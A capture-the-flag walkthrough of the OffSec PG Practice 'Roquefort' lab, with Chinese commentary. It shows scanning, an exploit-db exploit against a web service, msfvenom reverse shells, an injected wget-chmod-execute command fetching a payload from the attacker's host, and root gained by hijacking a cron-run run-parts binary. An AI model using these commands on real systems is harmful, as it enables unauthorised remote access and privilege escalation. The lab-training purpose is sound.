###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Roquefort
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.176.67 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.176.67:21
Open 192.168.176.67:22
Open 192.168.176.67:2222
Open 192.168.176.67:3000

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack ProFTPD 1.3.5b
22/tcp   open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
2222/tcp open  ssh     syn-ack Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open  ppp?    syn-ack
```

搜尋[edb-49383](https://www.exploit-db.com/exploits/49383)，先在`http://192.168.176.67:3000`註冊一個帳號使用
```
Username: admin1
Email Address: admin@gmail.com
Password: admin123
Re-Type Password: admin123
```

註冊好使用，開啟nc
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.184 LPORT=21 -f elf > shell_21

#修改49383.py
USERNAME = "admin1"
PASSWORD = "admin123"
HOST_ADDR = '192.168.45.184'
HOST_PORT = 3000
URL = 'http://192.168.176.67:3000'                                           
CMD = 'wget http://192.168.45.184:22/shell_21 -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'       

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp21
```

等~好久反彈，在`/home/chloe`可取得local.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
chloe@roquefort:/home/chloe$ cat local.txt
182eada99a88de25b94e24feb3448589
```

用`linpeas.sh`
```
chloe@roquefort:/tmp$ wget 192.168.45.184:22/linpeas.sh
chloe@roquefort:/tmp$ chmod +x linpeas.sh
chloe@roquefort:/tmp$ ./linpeas.sh

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
```

這邊有一個很奇怪的`run-parts`，路徑為`/usr/local/bin`
跑`pspy64`
```
chloe@roquefort:/usr/local/bin$ wget 192.168.45.184:22/pspy64
chloe@roquefort:/usr/local/bin$ chmod +x pspy64
chloe@roquefort:/usr/local/bin$ ./pspy64

...
2024/04/15 04:30:01 CMD: UID=0     PID=1126   | run-parts --report /etc/cron.hourly 
...
```

製作一個reverse，等反彈
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.184 LPORT=2222 -f elf > shell_2222

chloe@roquefort:/usr/local/bin$ wget 192.168.45.184:22/shell_2222
chloe@roquefort:/usr/local/bin$ mv shell_2222 run-parts
chloe@roquefort:/usr/local/bin$ chmod 777 run-parts

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp2222
```

得root可至/root得proof.txt
```
root@roquefort:/root# cat proof.txt
4ca0d37429d9034576d5f612cb26a24b
```